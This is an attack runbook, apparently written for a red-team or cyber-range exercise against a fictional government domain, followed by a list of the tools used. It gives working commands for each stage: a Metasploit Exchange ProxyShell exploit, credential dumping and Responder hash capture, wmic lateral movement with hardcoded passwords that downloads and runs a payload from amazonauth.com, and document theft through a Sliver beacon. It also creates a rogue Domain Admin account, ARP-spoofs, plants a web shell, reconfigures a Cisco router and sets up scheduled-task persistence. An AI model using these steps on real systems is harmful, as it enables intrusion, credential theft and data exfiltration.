segments.title: Complete Document
segments.content:
Initial Access
-	Udg-kali-1 terminal
msfconsole
msf> use exploit/windows/http/exchange_proxyshell_rce
msf> set RHOSTS 151.102.64.6
msf> set EMAIL Administrator@di.gov.gk
msf> set payload windows/x64/meterpreter/bind_tcp
## 3.3.10 Initial Access capture start 
msf> run
meterpreter > cd C:\\Users\\Administrator\\Documents
meterpreter > upload /home/user/Desktop/AWSAuthService.exe C:\\Users\\Administrator\\Documents\\AWSAuthService.exe
meterpreter > execute -f “C:\\Users\\Administrator\\Documents\\AWSAuthService.exe”
meterpreter > exit
## 3.3.10 Initial Access capture stop
Discovery
-	Udg-kali-1 terminal in cobalt strike ui
## 3.3.11(situational awareness) capture starts 
o	Interact with DI-EX beacon
shell ipconfig /all
logonpasswords
net domain_controllers
## 3.3.11(situational awareness) capture stop
-	Rogue Kali Machine with Reverse SSH setup is used for internal attacker tools.
-	Udg-kali-1 terminal
Ssh -p 2222 Administrator@localhost
## 3.3.5 mitm capture start 
Sudo ~/Responder/Responder.py -I ens33 -Pv
•	Runs until fannie.sparks hash is shown
## 3.3.5 mitm capture stop
Lateral Movement
## 3.3.11(Lateral Movement) capture start
-	Udg-kali-1 terminal in cobalt strike ui
o	Interact with DI-EX beacon
Shell wmic /node:”151.102.64.5”  /user:”DI\Administrator” /password:”P@ssw0rd” process call create “cmd.exe /c powershell -nop -w hidden -c \”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\Windows\AWSAuthService.exe’; Start-Process 'C:\Windows\AWSAuthService.exe’\""
o	Interact with DI-DC beacon
logonpasswords
net computers
Shell wmic /node:”151.102.65.144”  /user:”DI\rodrigo.allison” /password:”r4#Sw5GyL+5V” process call create “cmd.exe /c powershell -nop -w hidden -c \”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\Windows\AWSAuthService.exe’; Start-Process 'C:\Windows\AWSAuthService.exe’\""
Shell wmic /node:”151.102.65.142”  /user:”DI\shelia.serrano” /password:”xI#Yp6@4#8o#” process call create “cmd.exe /c powershell -nop -w hidden -c \”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\Windows\AWSAuthService.exe’; Start-Process 'C:\Windows\AWSAuthService.exe’\""
Shell wmic /node:”151.102.65.57”  /user:”DI\eduardo.wheeler” /password:”bL+6oA6P@W+x” process call create “cmd.exe /c powershell -nop -w hidden -c \”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\Windows\AWSAuthService.exe’; Start-Process 'C:\Windows\AWSAuthService.exe’\""
Shell wmic /node:”151.102.64.8”  /user:”DI\Administrator” /password:”P@ssw0rd” process call create “cmd.exe /c powershell -nop -w hidden -c \”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/AWSAuthService.exe' -OutFile 'C:\Windows\AWSAuthService.exe’; Start-Process 'C:\Windows\AWSAuthService.exe’\""
## 3.3.11(Lateral Movement) capture stop
ssh -p 2222 Administrator@localhost
sudo nmap -sV -O 151.102.65.143
## 3.3.11 Mounted Shares Capture Start
ssh fannie.sparks@151.102.65.143
net use S: \\31.148.54.96\Share
copy S:\* C:\Windows\System32\
## 3.3.11 Mounted Shares Capture Stop
## 3.3.7 & 3.3.8 DNS Beacon Capture Start
C:\Windows\System32\SymantecSysMonitor.exe
	In sliver beacon
sliver > use
sliver > cd C:\\Users\\fannie.sparks\\Documents
sliver > ls
sliver > download GK_DEFINTEL_ProjectHelios_TechOverview.docx

## 3.3.7 & 3.3.8 DNS Beacon Capture Stop (let run for a while to show max beacons)
	Back in ssh session
nltest /DCLIST:DI
nslookup di-dc.di.gov.gk
-	New UDG-kali-1 terminal
Ssh -p 2222 Administrator@localhost
Ssh fannie.sparks@151.102.64.5
powershell
New-ADUser -Name "Oliver Jones" -GivenName "Oliver" -Surname "Jones" -SamAccountName "oliver.jones" -UserPrincipalName "oliver.jones@di.gov.gk" -AccountPassword (ConvertTo-SecureString "1R34llyL0v3P1zz4!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "oliver.jones"
exit
exit

## 3.3.6 Arp Spoofing Capture Start
cd ~/Arp-Spoofer
sudo -E ./arpspoofer.py -i ens33 -f 151.102.65.1
y
	( to see traffic create another ssh session and use tcpdump)
## 3.3.6 Arp Spoofing Capture Stop (let run a while)
Persistence
## 3.3.12 (Persistence) Capture Start
-	Udg-kali-1 terminal in cobalt strike ui
o	Interact with DI-WEB beacon
cd C:\inetpub\wwwroot\aspnet_client
upload /home/user/util.aspx
(The web shell can be interacted with by using browser urls such as “151.102.64.8/aspnet_client/util.aspx?cmd=%22net%20localgroup%20administrators%22” )
## 3.3.11 (Persistence) Capture Stop
## 3.3.14 open port capture start
-	Udg-kali-1 terminal in cobalt strike ui
o	Interact with DI-W10-3 beacon
rportfwd 443 31.148.54.96 6666
## 3.3.14 open port capture stop
Network Device Attack
-	Udg-kali-1
o	In terminal
cd /home/user/sshbrutesim
python3 -m http.server 8080
o	Interact with DI-W11-5 beacon
upload /home/user/run_brute.ps1
shell powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File run_brute.ps1
o	 Interact with DI-W10-5  beacon
Socks 9050 socks5
o	In UDG Kali 1 Terminal
proxychains ssh cisco@151.102.65.1 (need to check proxychains4.conf)
conf t
ip nat inside source static tcp 151.102.65.1 443 interface GigabitEthernet3 8443
end
Anomalous Malicious Activity
Upload clrhost.ps1 to DI-W10-3, DI-W10-5, and DI-W11-5 using CS:
Upload /home/user/clrhost.ps1
Shell schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\system32\clrhost.ps1" /sc onlogon /rl HIGHEST

tools.name: Metasploit
tools.usage: Used via msfconsole to exploit Exchange ProxyShell RCE, set payload, and upload a malicious executable.

tools.name: Meterpreter
tools.usage: Post‑exploitation payload providing an interactive shell to upload and execute files on the compromised host.

tools.name: Cobalt Strike
tools.usage: Provides beacons for command‑and‑control, used for lateral movement, port forwarding, uploading web shells, and executing PowerShell commands.

tools.name: Responder
tools.usage: Run to capture NTLM hashes via LLMNR/NBT‑NS spoofing on the internal network.

tools.name: SSH
tools.usage: Used for reverse SSH tunnels, remote command execution, and mounting shares on compromised hosts.

tools.name: Nmap
tools.usage: Scans target host (151.102.65.143) for service/version detection and OS fingerprinting.

tools.name: Proxychains
tools.usage: Chains proxies to SSH into a Cisco device through a proxy configuration.

tools.name: Sliver
tools.usage: Used to interact with a DNS beacon and download documents from the compromised system.

tools.name: Arp Spoofer
tools.usage: Python script (arpspoofer.py) used to perform ARP spoofing against the target network.

tools.name: Python HTTP Server
tools.usage: Serves files over HTTP on port 8080 for later download by compromised hosts.

tools.name: run_brute.ps1
tools.usage: PowerShell script uploaded and executed to perform brute‑force attacks.

tools.name: clrhost.ps1
tools.usage: PowerShell script scheduled via schtasks to run on logon for persistence.

tools.name: Socks5 Proxy
tools.usage: Established on port 9050 to route traffic through Cobalt Strike.

tools.name: nltest
tools.usage: Used to enumerate domain controllers in the target environment.

tools.name: nslookup
tools.usage: Used to resolve DNS records for domain discovery.
